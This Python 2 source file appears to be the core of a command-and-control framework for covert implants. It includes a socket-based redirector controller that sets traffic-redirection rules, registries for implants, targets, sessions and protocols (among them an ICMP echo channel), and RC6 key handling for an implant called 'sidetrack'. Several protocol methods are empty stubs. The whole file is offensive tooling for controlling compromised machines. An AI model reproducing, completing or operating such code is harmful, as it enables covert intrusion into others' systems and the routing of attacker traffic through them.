from string import upper
from socket import *
import re
import struct
import hex

dblevel = 0
def db(level, text):
    global dblevel
    if level <= dblevel:
        print text

class RedirController:
    def __init__(self):
        self.sok = socket(AF_INET,SOCK_STREAM,0)

    def connect(self,addr,port):
        self.sok.connect((addr,port))
        pass

    def send(self,data):
        for i in range(len(data),224):
            data = data + '\000'
        return self.sok.send(data)

    
    def recv(self):
        return self.sok.recv(1500)

    def listen(self, laddr, faddr, fport, cblport, cbfport, timediff, key):
        data = struct.pack("!L",0x04) + laddr + faddr + \
               struct.pack("!HHHHLLLLL",fport,cblport,cbfport,0,timediff, \
                           key[0],key[1],key[2],key[3])
        self.send(data)
        data = self.recv()
        if struct.unpack("!L",data[0:4])[0] == 0:
            return struct.unpack("!L",data[4:8])[0]
        else:
            return 0

    def getAddr(self):
        data = struct.pack("!L",0x06)
        self.send(data)
        data = self.recv()
        return struct.unpack("!L",data[4:8])[0]

    def delete(self,rule):
        data = struct.pack("!LL",0x05L,rule)
        self.send(data)
        data = self.recv()
        return struct.unpack("!L",data[0:4])[0]

    def set(self,rule,value):
        data = struct.pack("!LL",0x09L,rule) + chr(value)
        self.send(data)
        data = self.recv()
        return struct.unpack("!L",data[0:4])[0]
        
    def redir(self,longevity,connto,redirIP,targIP,seqmod,munge,key,flags, \
              srcPort,dstPort,ident, protocol):
        data = struct.pack("!LLL",0x07L,longevity,connto) + redirIP + targIP +\
               struct.pack("!LLLLLLHHHH",seqmod,munge,\
                           key[0],key[1],key[2],key[3],flags,srcPort,dstPort,\
                           ident) + chr(protocol)
        self.send(data)
        data = self.recv()
        if struct.unpack("!L",data[0:4])[0] == 0:
            db(2,"Local rule %d added" %(struct.unpack("!L",data[4:8])[0]))
            return struct.unpack("!L",data[4:8])[0]
        else:
            db(1,"Local rule could not be added")
            return 0

    def redirlist(self,after):
        data = struct.pack("!LL",0x0a, after)
        self.send(data)
        data = self.recv()
        if struct.unpack("!L",data[4:8])[0] != 0:
            return struct.unpack("!LLLLLHHHH",data[4:30]+'\000'+data[30:31])
        else:
            return None
        


######################################################################
#   PROTOCOL class
######################################################################
class Protocol:
    def __init__(self):
        """ Init function """

#-----------------------------------------------------------------------
# Name   : SetDestination
# Purpose: Open a socket connection to the destination
# Receive: dest - The address of the destination (ip or hostname)
# Return : << nothing >>
#-----------------------------------------------------------------------
    def SetDestination(self, dest):
        """ Set the desired destination """

#-----------------------------------------------------------------------
# Name   : SendTo
# Purpose: Package and send data to the implant
# Receive: data - The pre-packaged (plain-text) data
# Return : << nothing >>
#-----------------------------------------------------------------------
    def SendTo(self, data):
        """ Send data to the destination """

#-----------------------------------------------------------------------
# Name   : RecvFrom
# Purpose: Get data back from the implant and decode it
# Receive: size - The maximum size of data to bring back
# Return : << nothing >>
#-----------------------------------------------------------------------
    def RecvFrom(self, size):
        """ Receive 'size' bytes from the target """

######################################################################
#   COMMAND class
######################################################################
class Command:
    def __init__(self):
        """ Init function """
        self.name = 'defcmd'
        self.usage = 'no usage available'
        self.info = 'no help available.'
        self.protocol = None
        self.implant = None

#-----------------------------------------------------------------------
# Name   : Run
# Purpose: Run's the command
# Receive: << Options vary depending on command >>
# Return : ([0-1], "Text")    1 if successful
#-----------------------------------------------------------------------
    def run(self):
        print 'It worked!'
        

######################################################################
#   IMPLANT class
######################################################################
class Implant:
    def __init__(self, session, proto):
        """ Init function """
        self.name = 'DEFIMP'
        self.session = session
        self.commands = {}
        self.protocol = proto
        self.protocol.implant = self
        self.RegisterCommands()
        self.parent = None
        self.children = []

#-----------------------------------------------------------------------
# Name   : RegisterCommands
# Purpose: Used to register commands for this implant
# Receive: << nothing >>
# Return : << nothing >>
#-----------------------------------------------------------------------
    def RegisterCommands(self):
        self.AddCommand('defimp', Command)

#-----------------------------------------------------------------------
# Name   : AddCommand
# Purpose: Add a command to the internal command dictionary
# Receive: name    - The name of the command
#          command - The command object
# Return : << nothing >>
#-----------------------------------------------------------------------
    def AddCommand(self, name, command):
        self.commands[upper(name)] = command
        return self.commands[upper(name)]

#-----------------------------------------------------------------------
# Name   : GetCommand
# Purpose: Search for a command in the internal command dictionary
# Receive: name - The name of the command
# Return : the initialized command object
#-----------------------------------------------------------------------
    def GetCommand(self, name):
        found = 0
        for key in self.commands.keys():
            if upper(key)[:len(name)] == upper(name):
                found = found + 1
                cmd = self.commands[upper(key)]
        if found == 1:
            cmd = cmd()
            cmd.implant = self
            return cmd
        return None

######################################################################
#   TARGET class
######################################################################
class Target:
    def __init__(self):
        """ Init function """
        self.session = None
        self.isMe = 0
        self.implantList = {}
        self.hasAnotherAddress = 0

#-----------------------------------------------------------------------
# Name   : AddImplant
# Purpose: Notifies the class that a specific implant may be used
# Receive: name - The name of the implant
# Return : the implant options list
#-----------------------------------------------------------------------
    def AddImplant(self, name):
        self.implantList[upper(name)] = {}
        return self.implantList[upper(name)]

#-----------------------------------------------------------------------
# Name   : SetImplantOpt
# Purpose: Gets options to be later passed on to the implant
# Receive: name - The name of the implant
#          opt  - The name of the option
#          value- The value of the option
# Return : the option
#-----------------------------------------------------------------------
    def SetImplantOpt(self, name, opt, value):
        self.implantList[upper(name)][upper(opt)] = value
        return self.implantList[upper(name)][upper(opt)]

#-----------------------------------------------------------------------
# Name   : GetImplantOpts
# Purpose: Return the implant options to the implant
# Receive: name - The name of the implant
# Return : the option list
#-----------------------------------------------------------------------
    def GetImplantOpts(self, name):
        return self.implantList[upper(name)]

    def GetIP(self):
        global redir
        if self.isMe == 0:
            return self.ip
        else:
            return redir.getAddr()

######################################################################
#   SESSION class
######################################################################
class Session:
    def __init__(self, target, implant):
        """ Init function """
        self.target=target
        self.target.session = self
        self.implant=implant(self,self.target.protocol())

#-----------------------------------------------------------------------
# Name   : GetCommand
# Purpose: Locates and returns a command
# Receive: command - The name of the command
# Return : the command object
#-----------------------------------------------------------------------
    def GetCommand(self,command):
        return self.implant.GetCommand(command)

        
        
redir = RedirController()

implantDict  = {}  # Holds all the implants
targetDict   = {}  # Holds all the targets
protocolDict = {}  # Holds all the protocols
sessionDict  = {}  # Holds target sessions
variableDict = {}  # Holds variables

#-----------------------------------------------------------------------
# Name   : RegisterImplant
# Purpose: Adds the specified implant to the database
# Receive: implant - The implant object
# Return : << nothing >>
#-----------------------------------------------------------------------
def RegisterImplant(name, implant):
    implantDict[upper(name)] = implant

#-----------------------------------------------------------------------
# Name   : GetImplant
# Purpose: Returns an implant object
# Receive: name - The name of the implant to return
# Return : the implant object
#-----------------------------------------------------------------------
def GetImplant(name):
    return implantDict[upper(name)]

#-----------------------------------------------------------------------
# Name   : RegisterTarget
# Purpose: Add a target to the target list
# Receive: target - An initialized target object
# Return : << nothing >>
#-----------------------------------------------------------------------
def RegisterTarget(target):
    #
    # If this is > 1.1 we need to reverse the keys
    # because the infrastructure version of RC6 likes everything
    # in reverse byte-order than normal
    #
    opts = target.GetImplantOpts('sidetrack')
    if opts['VERSION'] > 1.1:
        keys = opts['KEY']
        keys_reversed = [0L,0L,0L,0L]
        for i in range(4):
            keys_reversed[i] = struct.unpack("<L",struct.pack(">L",keys[i]))[0]
        target.SetImplantOpt('sidetrack', 'key', (keys_reversed[0], \
                                                  keys_reversed[1], \
                                                  keys_reversed[2], \
                                                  keys_reversed[3]))
    
    targetDict[upper(target.name)] = target

#-----------------------------------------------------------------------
# Name   : GetTarget
# Purpose: Returns an initialized target object from the list
# Receive: name - The name of the target
# Return : the initialized target object
#-----------------------------------------------------------------------
def GetTarget(name):
    return targetDict[upper(name)]

#-----------------------------------------------------------------------
# Name   : RegisterProtocol
# Purpose: Registers a communications protocol
# Receive: name  - The name of the protocol
#          proto - The protocol object
# Return : << nothing >>
#-----------------------------------------------------------------------
def RegisterProtocol(name, proto):
    protocolDict[upper(name)] = proto

#-----------------------------------------------------------------------
# Name   : GetProtocol
# Purpose: Returns the protocol object from the list
# Receive: name - The name of the protocol to return
# Return : the protocol object
#-----------------------------------------------------------------------
def GetProtocol(name):
    return protocolDict[upper(name)]

# Register the defaults
RegisterImplant('defimp', Implant)
RegisterProtocol('icmpecho', Protocol)


# Support functions
def SplitCommandString(cmd):
        args = {}
        regStr = '"[^"]*(\.[^"]*)*"|[^"\t ]*'
        reg = re.compile(regStr)
        #reg = regex.compile('"\([^\\"]\|[\\]["]?\)*"\|[^\t\n ]*')
        skip = re.compile('[\t\n ]*')
        #skip = regex.compile('[\t\n ]*')
        pos = skip.match(cmd,0)
        if pos == None:
            pos = 0
        else:
            pos = pos.end()
        i = 0
        while pos < len(cmd):
            Sstart  = reg.search(cmd,pos).start()
            Slength = reg.search(cmd,Sstart).end() - Sstart
            args[i] = cmd[Sstart:Sstart+Slength]
            # Strip the "'s
            if args[i][0:1] == '"':
                args[i] = args[i][1:len(args[i])-1]
            i = i + 1
            skipSize = skip.match(cmd[Sstart+Slength:]).end()
            pos = Sstart + Slength + skipSize
        return args
    

# Import the other modules
import modules

# Import the targets
import targets

localTarget = Target()
localTarget.isMe = 1
localTarget.protocol=GetProtocol('tcpstream')
me = Session(localTarget,GetImplant('STTUN'))
me.name = 'me'
me.implant.parent = me
sessionDict["me"] = me
me = None
localTarget=None
ccSupport = 0
